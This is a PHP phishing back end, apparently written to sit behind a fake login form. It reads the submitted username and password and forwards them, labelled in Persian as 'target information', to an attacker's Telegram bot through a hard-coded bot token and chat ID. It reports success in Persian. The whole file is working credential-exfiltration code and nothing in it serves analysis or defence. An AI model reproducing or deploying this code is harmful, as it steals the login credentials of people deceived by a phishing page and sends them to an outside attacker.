<?php
$username = filter_var($_POST['username'], FILTER_SANITIZE_STRING);
$password = filter_var($_POST['password'], FILTER_SANITIZE_STRING);

$Token = "8026401503:AAGDwnDthR4ZIPkWvWr-sqwf_PAUfjLopQQ";
$ID = '5717515741';

$message = "
<b>اطلاعات تارگت😃</b>
<b>یوزرنیم:</b> <code>$username</code>
<b>پسورد:</b> <code>$password</code>
<b>chanell: @tmo61</b>
";

$url = "https://api.telegram.org/bot$Token/sendMessage";
$params = [
    'chat_id' => $ID,
    'text' => $message,
    'parse_mode' => 'HTML',
];

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));

$response = curl_exec($ch);

if(curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
} else {
    $responseData = json_decode($response, true);
    if(!$responseData['ok']) {
        echo 'Telegram API error: ' . $responseData['description'];
    } else {
        echo 'پیام با موفقیت ارسال شد.';
    }
}

curl_close($ch);
?>
